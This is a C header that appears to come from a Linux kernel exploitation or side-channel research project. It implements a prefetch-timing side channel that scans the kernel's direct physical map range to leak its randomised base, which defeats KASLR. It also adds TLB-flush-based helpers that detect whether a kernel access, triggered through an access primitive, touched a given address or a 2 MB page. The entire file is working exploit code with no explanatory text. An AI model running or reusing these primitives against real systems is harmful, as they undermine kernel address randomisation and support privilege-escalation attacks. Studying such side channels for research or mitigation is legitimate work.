#pragma once

#include <stddef.h>
#include <stdlib.h>

#include "pipe_utils.c"
#include "timer.c"
#include "tlbflush.c"
#include "utils.c"

#define DPM_START	0xffff888000000000
#define DPM_END		0xffffc87fffffffff

#define DPM_THRESHOLD	36

#define TRIES		40

#define HIST_SIZE	120
#define HIST_SIZE_FLUSH 60

int
cmp(const void *e1, const void *e2)
{
	return *(size_t *)e1 > *(size_t *)e2;
}

inline void
prefetch(void *p)
{
	asm volatile("prefetchnta (%0)" : : "a"(p));
	asm volatile("prefetcht2 (%0)" : : "a"(p));
}

size_t __attribute__((noinline, aligned(4096)))
timed_prefetch(size_t addr)
{
	size_t time = rdtsc_begin();

	prefetch((void *)addr);

	return rdtsc_end() - time;
}

int
hit(size_t addr, size_t tries)
{
	prefetch((void *)addr);
	for (size_t i = 0; i < tries; i++) {
		size_t time = rdtsc_begin();

		prefetch((void *)addr);

		time = rdtsc_end() - time;

		if (time <= DPM_THRESHOLD) {
			return 1;
		}
	}

	return 0;
}
int
hit_accurate(size_t addr, size_t tries)
{
	size_t times[tries];
	prefetch((void *)addr);
	for (size_t i = 0; i < tries; i++) {
		times[i] = timed_prefetch(addr);
	}
	qsort(times, tries, sizeof(size_t), cmp);
	return times[tries / 4] <= DPM_THRESHOLD;
}

void
threshold_hit_flush(size_t addr, size_t tries)
{
	size_t times[tries];
	size_t times_n[tries];
	size_t hist[HIST_SIZE_FLUSH] = { 0 };
	size_t hist_n[HIST_SIZE_FLUSH] = { 0 };
	for (size_t i = 0; i < tries; ++i) {
		prefetch((void *)addr);
		asm volatile("lfence");
		asm volatile("mfence");

		size_t time = timed_prefetch(addr);

		size_t time_n = timed_prefetch(addr);

		asm volatile("lfence");
		asm volatile("mfence");

		times[i] = time;
		times_n[i] = time_n;
		hist[MIN(time, HIST_SIZE_FLUSH - 2)]++;
		hist_n[MIN(time_n, HIST_SIZE_FLUSH - 2)]++;
	}
	qsort(times, tries, sizeof(size_t), cmp);
	qsort(times_n, tries, sizeof(size_t), cmp);

	for (size_t i = 20; i < HIST_SIZE_FLUSH; i += 2) {
		printf("hit_flush: hist: %02ld: % 5ld % 5ld\n", i, hist[i],
		    hist_n[i]);
	}
}

size_t
dpm_leak(size_t tries)
{
	size_t dpm_found = 0;
	size_t dpm_base;
	for (dpm_base = DPM_START; dpm_base < DPM_END;
	    dpm_base += (1LLU << 30)) {
		for (size_t i = 0; i < tries; i++) {
			dpm_found = hit(dpm_base, 4) &&
			    hit_accurate(dpm_base, 30);
			if (dpm_found) {
				break;
			}
		}
		if (dpm_found) {
			break;
		}
	}

	return dpm_base;
}

void
get_times(int fd, size_t addr, size_t *time, size_t *time_n2, size_t *time_n4)
{
	size_t times[TRIES], times_n2[TRIES], times_n4[TRIES];

	for (size_t i = 0; i < TRIES; i++) {
		targeted_tlb_flush(addr);
		targeted_tlb_flush(addr + 2 * (1 << 12));
		targeted_tlb_flush(addr + 4 * (1 << 12));
		access_primitive(fd);
		times[i] = timed_prefetch(addr);
		times_n2[i] = timed_prefetch(addr + 2 * (1 << 12));
		times_n4[i] = timed_prefetch(addr + 4 * (1 << 12));
	}
	qsort(times, TRIES, sizeof(size_t), cmp);
	qsort(times_n2, TRIES, sizeof(size_t), cmp);
	qsort(times_n4, TRIES, sizeof(size_t), cmp);
	*time = times[TRIES / 4];
	*time_n2 = times_n2[TRIES / 4];
	*time_n4 = times_n4[TRIES / 4];
}

size_t
hit_flush(int fd, size_t addr)
{
	size_t time, time_n2, time_n4;
	get_times(fd, addr, &time, &time_n2, &time_n4);
	return (time < DPM_THRESHOLD &&
	    (time_n2 > DPM_THRESHOLD || time_n4 > DPM_THRESHOLD));
}

int
is_2mb(int fd, size_t addr)
{
	size_t time, time_n2, time_n4;
	get_times(fd, addr, &time, &time_n2, &time_n4);
	return (time < DPM_THRESHOLD && time_n2 < DPM_THRESHOLD &&
	    time_n4 < DPM_THRESHOLD);
}
